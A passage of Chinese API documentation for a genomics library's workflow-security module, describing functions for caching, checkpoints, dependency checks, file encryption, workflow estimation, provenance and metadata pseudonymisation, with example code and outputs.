# 工作流运行与数据安全

本类收录 `workflow_security` 模块的 **27** 个函数。其中 20 个会计算出真实结果：它们只读取规范、文件和 Python 环境，且都不会执行用户命令（可选包 `cryptography` 缺失时，`encrypt_genomic_file` 和 `decrypt_genomic_file` 返回 `not_implemented`）。另有 7 个（`benchmark`、`cancel`、`clear`、`monitor`、`retry`、`submit_cloud_job`、`submit_hpc_job`）始终返回 `status: "not_implemented"`，因为它们需要执行工作负载或接入调度器、云账号。示例输出均为真实运行结果；`input_summary` 简写为 `{...}`。

## 1) benchmark

- **作用：** 未实现：对工作流或命令做基准测试必须执行它，而 `workflow_security` 从不执行用户命令。

- **处理方法：** 不做任何计算，只返回如实的 `not_implemented` 封装；如需基于各步骤声明资源的静态估算，请用 `estimate`。

- **API：** `dnakit.workflow_security.benchmark(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：任意值（仅在 `input_summary` 中汇总）；`options` 不起作用。

- **输出：** 始终返回 `status: "not_implemented"` 的封装，含 `required_dependency`（“允许运行被测工作流的执行后端”）和 `message`（基准测试需要执行工作负载，而 workflow_security 从不执行用户命令），没有 `result`；正常调用不会抛出异常。

- **示例代码：**

```python
import json
from dnakit.workflow_security import benchmark

result = benchmark({"command": ["fastqc", "reads.fq"]})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "benchmark",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "an execution backend allowed to run the workflow under test",
  "message": "Benchmarking needs to execute the workload; workflow_security never executes user commands."
}
```

## 2) cache

- **作用：** 计算步骤描述的内容寻址缓存键，并报告对应缓存条目是否存在。

- **处理方法：** 键为 `{"step": input, "files": {path: sha256}, "salt": salt}` 的规范化 JSON（键排序、紧凑分隔符）的 SHA-256；因此步骤描述、输入文件内容或 salt 任一改变，键都会改变。不会写入任何内容。

- **API：** `dnakit.workflow_security.cache(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：任意可 JSON 序列化的步骤描述（映射、列表或字符串）。`options`：`input_files`（其内容摘要参与计算键的已存在文件路径列表，默认无；文件不存在会抛 `InputFormatError`）、`salt`（字符串，默认 `""`）、`cache_dir`（目录；给出时，若存在 `<cache_dir>/<key>` 或 `<cache_dir>/<key>.json` 则 `hit` 为 true，否则为 false；不给时 `hit` 为 `null`）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `cache_key`（64 位十六进制）、`hit`（`true`/`false`，未给 `cache_dir` 时为 `null`）和 `input_files`（路径 -> SHA-256）。

- **示例代码：**

```python
import json
from dnakit.workflow_security import cache

result = cache({"tool": "fastqc", "args": ["reads.fq"]}, options={"salt": "v1", "cache_dir": "."})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "cache",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "cache_key": "364dd9b901c20e8210034ac58f2ec04bc7b2a7b3306e9f26889cc1ccf2a2f29b",
    "hit": false,
    "input_files": {}
  }
}
```

## 3) cancel

- **作用：** 未实现：取消操作需要正在运行的作业或调度器句柄，而本库不保存这类状态。

- **处理方法：** 不做任何计算；进程内没有作业注册表，因此没有可终止的对象。

- **API：** `dnakit.workflow_security.cancel(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：任意值（仅在 `input_summary` 中汇总）；`options` 不起作用。

- **输出：** 始终返回 `status: "not_implemented"` 的封装，含 `required_dependency`（“拥有该运行作业的作业调度器或进程管理器”）和 `message`（进程内没有作业注册表，因此 cancel 没有可终止的对象），没有 `result`；正常调用不会抛出异常。

- **示例代码：**

```python
import json
from dnakit.workflow_security import cancel

result = cancel("job-42")
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "cancel",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "a job scheduler or process supervisor that owns the running job",
  "message": "There is no job registry in this process, so there is nothing that cancel could stop."
}
```

## 4) check_dependencies

- **作用：** 检查 Python 包是否已安装并满足可选的版本约束，且不导入这些包。

- **处理方法：** 版本取自 `importlib.metadata`；若无发行版元数据，则当 `importlib.util.find_spec` 能找到该模块时视为已安装（此时 `version` 为 `null`）。版本按点分整数分量比较（忽略 `rc1` 等后缀），每个需求只支持一个条件。缺失的包只作报告，不抛异常。

- **API：** `dnakit.workflow_security.check_dependencies(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：以逗号/空白分隔的字符串、需求字符串列表（如 `"numpy>=1.24"`，运算符 `==`、`!=`、`>=`、`<=`、`>`、`<`），或映射 `name -> constraint`。格式错误的需求会抛 `InputFormatError`。`options` 不起作用。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `all_satisfied` 和 `requirements`（每个需求一行，含 `requirement`、`name`、`installed`、`version`、`satisfied`）。

- **示例代码：**

```python
import json
from dnakit.workflow_security import check_dependencies

result = check_dependencies(["numpy>=1.0", "scipy", "no_such_package_xyz"])
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "check_dependencies",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "all_satisfied": false,
    "requirements": [
      {
        "requirement": "numpy>=1.0",
        "name": "numpy",
        "installed": true,
        "version": "2.2.6",
        "satisfied": true
      },
      {
        "requirement": "scipy",
        "name": "scipy",
        "installed": true,
        "version": "1.17.1",
        "satisfied": true
      },
      {
        "requirement": "no_such_package_xyz",
        "name": "no_such_package_xyz",
        "installed": false,
        "version": null,
        "satisfied": false
      }
    ]
  }
}
```

## 5) check_external_tools

- **作用：** 用 `shutil.which` 在 `PATH` 中查找外部程序，不执行这些程序。

- **处理方法：** 若输入是工作流规范（映射或形如 JSON 的文本），则检查各步骤命令的程序（argv 第一个词），去重并保持顺序；否则输入直接给出工具名。

- **API：** `dnakit.workflow_security.check_external_tools(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：程序名、以逗号分隔的字符串或名称/路径列表，或带 `command` 步骤的工作流规范。`options` 不起作用。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `all_available` 和 `tools`（每个不同工具一行，含 `tool`、`available` 和解析出的 `path`，找不到时为 `null`）。示例中的 `path` 取决于运行机器。

- **示例代码：**

```python
import json
from dnakit.workflow_security import check_external_tools

result = check_external_tools(["python3", "no_such_tool_xyz"])
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "check_external_tools",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "all_available": false,
    "tools": [
      {
        "tool": "python3",
        "available": true,
        "path": "/opt/conda/bin/python3"
      },
      {
        "tool": "no_such_tool_xyz",
        "available": false,
        "path": null
      }
    ]
  }
}
```

## 6) check_numerical_reproducibility

- **作用：** 逐元素比较多次运行的数值结果，并报告它们在容差内是否一致。

- **处理方法：** 每次运行都被展平后与第一次比较。两个值 `a`、`b` 在 `|a-b| <= max(rtol * max(|a|, |b|), atol)` 时视为一致；`max_rel_diff` 为 `|a-b| / max(|a|, |b|)`（两者均为 0 时取 0）。长度不同的运行标记为 `length_match: false`。`bitwise_identical` 表示所有值完全相等。仅当 `equal_nan` 为 true 时，NaN 对才视为一致。

- **API：** `dnakit.workflow_security.check_numerical_reproducibility(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：至少两次运行的列表（每次为数字或平铺/嵌套的数字列表；布尔值和字符串会被拒绝），或映射 `{"runs": [...]}`。`options`：`rtol`（默认 1e-9）、`atol`（默认 0.0）、`equal_nan`（默认 false）；容差为负会抛 `ConfigurationError`。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `reproducible`、`bitwise_identical`、`max_abs_diff`、`max_rel_diff`、`rtol`、`atol` 和 `runs`（每个被比较的运行一行：`run`、`length_match`、`agrees`、`max_abs_diff`、`max_rel_diff`、`bitwise_identical`）。

- **示例代码：**

```python
import json
from dnakit.workflow_security import check_numerical_reproducibility

result = check_numerical_reproducibility([[1.0, 2.0, 3.0], [1.0, 2.0, 3.0000000001]], options={"rtol": 1e-6})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "check_numerical_reproducibility",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "reproducible": true,
    "bitwise_identical": false,
    "max_abs_diff": 1.000000082740371e-10,
    "max_rel_diff": 3.333333609023459e-11,
    "rtol": 1e-06,
    "atol": 0.0,
    "runs": [
      {
        "run": 1,
        "length_match": true,
        "agrees": true,
        "max_abs_diff": 1.000000082740371e-10,
        "max_rel_diff": 3.333333609023459e-11,
        "bitwise_identical": false
      }
    ]
  }
}
```

## 7) checkpoint

- **作用：** 为可 JSON 序列化的工作流状态构建带校验和的检查点文档，可选写入文件。

- **处理方法：** 文档为 `{"format": "dnakit-checkpoint-v1", "step", "created_at", "state", "state_sha256"}`，其中 `state_sha256` 是 `state` 的规范化 JSON（键排序、紧凑分隔符）的 SHA-256。仅在给出 `path` 时写文件，且为原子写入（先写目标目录中的临时文件再重命名）。用 `resume` 校验并读回检查点。

- **API：** `dnakit.workflow_security.checkpoint(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：任意可 JSON 序列化的状态（NaN 和非 JSON 值会抛 `InputFormatError`）。`options`：`step`（标签，默认 `"checkpoint"`）、`timestamp`（ISO 字符串，默认当前 UTC 时间）、`path`（要写入的文件；不给则不写）、`overwrite`（默认 false；文件已存在会抛 `ConfigurationError`）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `checkpoint`（文档）和 `path`（已写入的文件，未写时为 `null`）。

- **示例代码：**

```python
import json
from dnakit.workflow_security import checkpoint

result = checkpoint({"done": ["qc"], "n_reads": 1000}, options={"step": "after_qc", "timestamp": "2026-01-01T00:00:00+00:00", "path": "ckpt.json"})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "checkpoint",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "checkpoint": {
      "format": "dnakit-checkpoint-v1",
      "step": "after_qc",
      "created_at": "2026-01-01T00:00:00+00:00",
      "state": {
        "done": [
          "qc"
        ],
        "n_reads": 1000
      },
      "state_sha256": "1982c9ccd50c401b2cd515b4768b85d72a99863bcfdcd204bad3c405de2d27ab"
    },
    "path": "ckpt.json"
  }
}
```

## 8) cleanup_temp_workspace

- **作用：** 盘点临时工作目录，仅在明确要求时才删除。

- **处理方法：** 先检查安全规则：路径必须是真实目录（非符号链接），严格位于 `allowed_root`（默认系统临时目录）之内，且目录名以 `prefix` 开头；否则抛 `ConfigurationError`（`UNSAFE_CLEANUP_TARGET`）。统计文件数和字节数时不跟随符号链接。删除（`dry_run: false`）即对该目录执行 `shutil.rmtree`，其中的符号链接只会被移除而不会被跟随。

- **API：** `dnakit.workflow_security.cleanup_temp_workspace(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：目录路径（字符串或 path-like）。`options`：`dry_run`（默认 true：仅统计）、`allowed_root`（默认系统临时目录）、`prefix`（默认 `"dnakit-"`）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `path`（解析后的路径）、`files`、`bytes`、`dry_run` 和 `deleted`。示例中的临时路径被替换为 `<workspace>`。

- **示例代码：**

```python
import json
import tempfile
from pathlib import Path

from dnakit.workflow_security import cleanup_temp_workspace

workspace = Path(tempfile.mkdtemp(prefix="dnakit-", dir="."))
(workspace / "a.txt").write_text("hello")
result = cleanup_temp_workspace(workspace, options={"allowed_root": "."})
result["result"]["path"] = "<workspace>"
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "cleanup_temp_workspace",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "path": "<workspace>",
    "files": 1,
    "bytes": 5,
    "dry_run": true,
    "deleted": false
  }
}
```

## 9) clear

- **作用：** 未实现：函数名没有指明要清除什么，且本库不保存可重置的工作流状态。

- **处理方法：** 不做任何计算。如需检查或删除临时目录，请用 `cleanup_temp_workspace`。

- **API：** `dnakit.workflow_security.clear(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：任意值（仅在 `input_summary` 中汇总）；`options` 不起作用。

- **输出：** 始终返回 `status: "not_implemented"` 的封装，含 `required_dependency`（“需要清除的具体状态存储（缓存目录、作业队列）”）和 `message`（clear 没有明确的目标；清理临时目录请用 cleanup_temp_workspace），没有 `result`；正常调用不会抛出异常。

- **示例代码：**

```python
import json
from dnakit.workflow_security import clear

result = clear("cache")
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "clear",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "a concrete state store (cache directory, job queue) to clear",
  "message": "clear has no defined target; use cleanup_temp_workspace for a temporary directory."
}
```

## 10) create

- **作用：** 由步骤列表或不完整的规范构建规范化且已校验的工作流规范。

- **处理方法：** 纯命令字符串会变成步骤；没有 id 的步骤按位置命名为 `step_1`、`step_2`……。规范按 `validate` 的方式校验（结构、依赖、环、凭据、危险命令、路径），任何错误都会抛 `InputFormatError`（`INVALID_WORKFLOW_SPEC`，发现项放在上下文中）；警告会复制到封装的 `warnings`。`order` 为拓扑序（Kahn 算法，并列时按声明顺序），`sha256` 是其余字段规范化 JSON 的摘要。

- **API：** `dnakit.workflow_security.create(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：带 `steps`（及可选 `name`）的映射，或元素为步骤映射/命令字符串的列表；`steps` 也可以是映射 `id -> step`。`options`：`name`（默认 `"workflow"`）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `format`（`dnakit-workflow-security-spec-v1`）、`name`、`steps`（每个都有 `depends_on` 列表）、`order` 和 `sha256`。

- **示例代码：**

```python
import json
from dnakit.workflow_security import create

result = create(["fastqc reads.fq", {"id": "align", "command": ["bwa", "mem", "ref.fa", "reads.fq"], "depends_on": ["step_1"]}], options={"name": "demo"})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "create",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "format": "dnakit-workflow-security-spec-v1",
    "name": "demo",
    "steps": [
      {
        "id": "step_1",
        "command": "fastqc reads.fq",
        "depends_on": []
      },
      {
        "id": "align",
        "command": [
          "bwa",
          "mem",
          "ref.fa",
          "reads.fq"
        ],
        "depends_on": [
          "step_1"
        ]
      }
    ],
    "order": [
      "step_1",
      "align"
    ],
    "sha256": "44ae51528e55c20023e06ef443c8f7b13e04a26651b5a3b67f24a2b5afc10b3a"
  }
}
```

## 11) decrypt_genomic_file

- **作用：** 用给定密钥解密由 `encrypt_genomic_file` 生成的文件（Fernet 令牌）。

- **处理方法：** 使用 Fernet（`cryptography.fernet`：AES-128-CBC 加 HMAC-SHA256 认证）。整个文件读入内存，因此超过 `max_bytes` 的文件会被拒绝。密钥错误或文件不是 Fernet 令牌时抛 `InputFormatError`（`DECRYPTION_FAILED`）；输出为原子写入，输出已存在时除非 `overwrite` 为 true，否则抛 `ConfigurationError`。输出路径不得与输入相同。 若未安装可选包 `cryptography`，函数返回 `status: "not_implemented"` 与 `required_dependency: "pip install cryptography"`。

- **API：** `dnakit.workflow_security.decrypt_genomic_file(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：加密文件的路径。`options`：`key`（urlsafe-base64 的 Fernet 密钥，32 字节）或 `key_env`（保存密钥的环境变量名）（二者必须给一个）、`output`（默认去掉 `.enc` 后缀，否则为输入加 `.dec`）、`overwrite`（默认 false）、`max_bytes`（默认 256 MiB）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `output`、`bytes_in`、`bytes_out`、`plaintext_sha256` 和 `algorithm`（`fernet-aes128-cbc-hmac-sha256`）。

- **示例代码：**

```python
import json
from dnakit.workflow_security import decrypt_genomic_file, encrypt_genomic_file

open("sample.vcf", "w").write("##fileformat=VCFv4.2\n")
enc = encrypt_genomic_file("sample.vcf", options={"generate_key": True})
key = enc["result"]["generated_key"]
result = decrypt_genomic_file("sample.vcf.enc", options={"key": key, "output": "restored.vcf"})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "decrypt_genomic_file",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "output": "restored.vcf",
    "bytes_in": 120,
    "bytes_out": 21,
    "plaintext_sha256": "ce31594f9acbe614b2c4cf7303773109a88a507fe58209ec89b797634e4817bd",
    "algorithm": "fernet-aes128-cbc-hmac-sha256"
  }
}
```

## 12) encrypt_genomic_file

- **作用：** 用带认证的对称加密（Fernet：AES-128-CBC + HMAC-SHA256）加密文件。

- **处理方法：** 整个文件读入内存（超过 `max_bytes` 的文件会被拒绝），用 `cryptography.fernet.Fernet` 加密；密文为原子写入，输出已存在时除非 `overwrite` 为 true，否则抛 `ConfigurationError`。使用 `generate_key` 时会新建密钥并只通过 `generated_key` 返回一次，并给出请妥善保存的警告。结果只含大小和明文的 SHA-256，不含明文。 若未安装可选包 `cryptography`，函数返回 `status: "not_implemented"` 与 `required_dependency: "pip install cryptography"`。

- **API：** `dnakit.workflow_security.encrypt_genomic_file(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：明文文件路径。`options`：`key`（urlsafe-base64 的 Fernet 密钥，32 字节）或 `key_env`（保存密钥的环境变量名），或 `generate_key`（true：新建密钥）、`output`（默认输入加 `.enc`）、`overwrite`（默认 false）、`max_bytes`（默认 256 MiB）。未给任何密钥选项时抛 `ConfigurationError`（`KEY_MISSING`）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `output`、`bytes_in`、`bytes_out`、`plaintext_sha256`、`algorithm`，使用 `generate_key` 时还有 `generated_key`。示例中生成的密钥被替换为 `<key>`。

- **示例代码：**

```python
import json
from dnakit.workflow_security import encrypt_genomic_file

open("sample.vcf", "w").write("##fileformat=VCFv4.2\n")
result = encrypt_genomic_file("sample.vcf", options={"generate_key": True})
result["result"]["generated_key"] = "<key>"
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "encrypt_genomic_file",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [
    "A key was generated; store it safely, the data cannot be decrypted without it."
  ],
  "status": "ok",
  "result": {
    "output": "sample.vcf.enc",
    "bytes_in": 21,
    "bytes_out": 120,
    "plaintext_sha256": "ce31594f9acbe614b2c4cf7303773109a88a507fe58209ec89b797634e4817bd",
    "algorithm": "fernet-aes128-cbc-hmac-sha256",
    "generated_key": "<key>"
  }
}
```

## 13) estimate

- **作用：** 根据各步骤声明的资源，估算工作流规范的墙钟时间和峰值资源。

- **处理方法：** 采用工人数不限的“尽早调度”：步骤在其所有依赖结束后开始，`wall_time_s` 为关键路径长度，`total_cpu_seconds` 为 `cpus * runtime_s` 之和，`total_disk_mb` 为 `disk_mb` 之和，峰值取同时运行的步骤（正时长的半开区间）。这是基于声明的静态估算，不是实测。依赖图无效会抛 `InputFormatError`。

- **API：** `dnakit.workflow_security.estimate(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：工作流规范（映射、JSON/YAML 文本或文件路径）；步骤可声明 `cpus`、`memory_mb`、`runtime_s`、`disk_mb` 和 `depends_on`。`options`：`default_cpus`（1）、`default_memory_mb`（0）、`default_runtime_s`（0）、`default_disk_mb`（0），用于省略这些值的步骤；`max_cpus`（峰值超过时增加警告）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `wall_time_s`、`critical_path`、`total_cpu_seconds`、`peak_cpus`、`peak_memory_mb`、`peak_concurrent_steps`、`total_disk_mb`、`schedule`（`id`、`start_s`、`end_s`）和 `steps_without_runtime`。

- **示例代码：**

```python
import json
from dnakit.workflow_security import estimate

workflow = {
    "name": "demo",
    "steps": [
        {"id": "qc", "command": ["fastqc", "reads.fq"], "cpus": 2, "memory_mb": 100, "runtime_s": 10},
        {"id": "align", "command": ["bwa", "mem", "ref.fa", "reads.fq"], "depends_on": ["qc"], "cpus": 4, "memory_mb": 800, "runtime_s": 60},
        {"id": "report", "command": ["multiqc", "."], "depends_on": ["align"], "runtime_s": 5},
    ],
}
result = estimate(workflow)
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "estimate",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "wall_time_s": 75.0,
    "critical_path": [
      "qc",
      "align",
      "report"
    ],
    "total_cpu_seconds": 265.0,
    "peak_cpus": 4.0,
    "peak_memory_mb": 800.0,
    "peak_concurrent_steps": 1,
    "total_disk_mb": 0.0,
    "schedule": [
      {
        "id": "qc",
        "start_s": 0.0,
        "end_s": 10.0
      },
      {
        "id": "align",
        "start_s": 10.0,
        "end_s": 70.0
      },
      {
        "id": "report",
        "start_s": 70.0,
        "end_s": 75.0
      }
    ],
    "steps_without_runtime": []
  }
}
```

## 14) monitor

- **作用：** 未实现：监控需要有正在运行的作业或可观察的调度器。

- **处理方法：** 不做任何计算；本库不保存运行中作业的句柄。

- **API：** `dnakit.workflow_security.monitor(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：任意值（仅在 `input_summary` 中汇总）；`options` 不起作用。

- **输出：** 始终返回 `status: "not_implemented"` 的封装，含 `required_dependency`（“能提供作业状态的作业调度器或进程管理器”）和 `message`（本库中没有可监控的运行中作业句柄），没有 `result`；正常调用不会抛出异常。

- **示例代码：**

```python
import json
from dnakit.workflow_security import monitor

result = monitor("job-42")
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "monitor",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "a job scheduler or process supervisor exposing job status",
  "message": "There is no running job handle to monitor in this library."
}
```

## 15) read

- **作用：** 从映射、JSON/YAML 文本或 JSON/YAML 文件读取工作流规范或配置。

- **处理方法：** 先尝试 JSON，再用 YAML 安全加载器（不支持标签，不执行代码）。超过 1,000,000 字节的文本会被拒绝，顶层必须是映射（否则抛 `InputFormatError`）。不含换行且不以 `{` 或 `[` 开头的字符串被当作文件路径。

- **API：** `dnakit.workflow_security.read(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：映射、JSON/YAML 文本，或 JSON/YAML 文件路径。`options` 不起作用。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `document`（解析出的映射）、`source`（`"inline"` 或文件路径）、`sha256`（其规范化 JSON 的摘要）和 `top_level_keys`。

- **示例代码：**

```python
import json
from dnakit.workflow_security import read

result = read('{"name": "demo", "steps": [{"id": "qc", "command": ["fastqc", "reads.fq"]}]}')
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "read",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "document": {
      "name": "demo",
      "steps": [
        {
          "id": "qc",
          "command": [
            "fastqc",
            "reads.fq"
          ]
        }
      ]
    },
    "source": "inline",
    "sha256": "64991aacf622cef75fc7ba4876dead0369b9f56cfdaf6b496be1fc2232bd67b0",
    "top_level_keys": [
      "name",
      "steps"
    ]
  }
}
```

## 16) record_provenance

- **作用：** 为处理步骤创建溯源记录，包含其输入输出文件的 SHA-256 摘要。

- **处理方法：** 对 `inputs` 和 `outputs` 计算摘要（`exists`、`size`、`sha256`；最多 1000 个文件）；缺失的文件记为 `exists: false` 并给出警告。记录还包含 Python、平台和 DNAKit 版本、时间戳以及 `record_sha256`（其余字段规范化 JSON 的 SHA-256）。输入中任何看似凭据的文本（AWS 密钥 id、私钥块、GitHub/Slack 令牌、bearer 令牌、`password=...` 赋值）都会被拒绝，抛 `ConfigurationError`（`SECRET_IN_PROVENANCE`）。

- **API：** `dnakit.workflow_security.record_provenance(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：形如 `{"tool", "version", "parameters", "command", "inputs": [路径], "outputs": [路径]}` 的映射。`options`：`timestamp`（ISO 字符串，默认当前时间）、`output`（原子写入的 JSON 文件；不给则不写）、`overwrite`（默认 false）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`（每个缺失文件一条警告）；`result` 即记录本身：`format`（`dnakit-provenance-v1`）、`created_at`、`step`、`inputs`、`outputs`、`environment`（`python`、`platform`、`dnakit`）和 `record_sha256`。`environment` 的值取决于运行机器。

- **示例代码：**

```python
import json
from dnakit.workflow_security import record_provenance

open("reads.fq", "w").write("@r1\nACGT\n+\nIIII\n")
result = record_provenance(
    {"tool": "fastqc", "version": "0.12", "inputs": ["reads.fq"], "outputs": ["report.html"]},
    options={"timestamp": "2026-01-01T00:00:00+00:00"},
)
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "record_provenance",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [
    "file not found: report.html"
  ],
  "status": "ok",
  "result": {
    "format": "dnakit-provenance-v1",
    "created_at": "2026-01-01T00:00:00+00:00",
    "step": {
      "tool": "fastqc",
      "version": "0.12"
    },
    "inputs": [
      {
        "path": "reads.fq",
        "exists": true,
        "size": 16,
        "sha256": "8add5b3bf0a7df65f939b0f2f0650f97ae63c37796bf0d1e769b384e666986cd"
      }
    ],
    "outputs": [
      {
        "path": "report.html",
        "exists": false,
        "size": null,
        "sha256": null
      }
    ],
    "environment": {
      "python": "3.12.13",
      "platform": "Linux-5.15.0-60-generic-x86_64-with-glibc2.31",
      "dnakit": "0.2.0"
    },
    "record_sha256": "c3f09ba34eac87f73b502391c131e20ff4d207a7494f7b3c32c223cdd57c09bc"
  }
}
```

## 17) pseudonymize_metadata_fields

- **作用：** 对元数据映射（或映射列表）做字段假名化：在任意嵌套深度替换、删除或用带密钥的哈希处理识别性键的值，并替换文本中的电子邮件地址、电话号码和类似社保号的模式。这是基于键名和模式的假名化，并不保证完成去标识化。它取代了早先的一个函数——那个函数只用无盐 SHA-256 处理六个顶层键，名称承诺的比实际做到的多，因此已被移除。

- **处理方法：** 在 `src/dnakit/_metadata_pseudonymize.py` 中只实现一次，并与 `dnakit.knowledge_graph.pseudonymize_genomic_metadata_fields` 共用。输入不会被修改，对深拷贝做转换。当一个键的名称转为小写并去掉字母和数字以外的所有字符后（因此 `Patient_ID`、`patient id`、`PATIENTID` 视为相同）出现在默认列表中时，该键被视为敏感键：`name`、`first/last/full/given/family/middle name`、`surname`、`patient`、`patient id`、`patient name`、`mrn`、`medical record number`、`ssn`、`social security number`、`email`、`email address`、`phone`、`phone number`、`telephone`、`mobile`、`fax`、`address`、`home/street address`、`street`、`city`、`zip`、`zip code`、`postal code`、`postcode`、`dob`、`date of birth`、`birth date`、`birthday`、`national id`、`passport`、`passport number`、`insurance`、`insurance id/number`、`account number`、`ip address`、`device id`、`photo`、`photograph`、`biometric(s)`、`license number`、`driver license`。匹配是对规范化名称的精确匹配（`sample_name` 不会命中）；`options['keys']` 增加名称，`options['keep']` 去掉名称（keep 